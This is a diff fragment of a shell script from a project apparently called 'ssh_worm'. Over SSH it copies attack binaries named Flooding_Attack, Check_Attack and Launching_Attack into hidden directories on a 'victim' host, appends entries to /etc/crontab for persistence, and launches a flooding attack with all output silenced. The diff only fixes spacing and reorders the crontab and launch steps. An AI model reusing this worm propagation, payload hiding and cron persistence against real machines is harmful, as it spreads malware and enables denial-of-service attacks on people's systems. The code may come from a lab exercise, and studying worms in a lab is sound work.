@@ -29,7 +29,7 @@ ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore";
 			mkdir -p $Hidden1;
 			cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1;
 			cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1;
-			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1> /dev/null 2>&1'
+			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1 > /dev/null 2>&1'
 
 echo "qq1"
 
@@ -37,13 +37,13 @@ ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
 			mkdir -p $Hidden2;
 			cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2;
 			cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2;
-			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2> /dev/null 2>&1'
+			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2 > /dev/null 2>&1'
 
 echo "qq2"
 
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
-			cd "$Hidden2" && ./Flooding_Attack;
-			echo "$(cat crontab.txt)" >> /etc/crontab> /dev/null 2>&1'
+			echo "$(cat crontab.txt)" >> /etc/crontab;
+			cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
 
 echo "qq3"
 
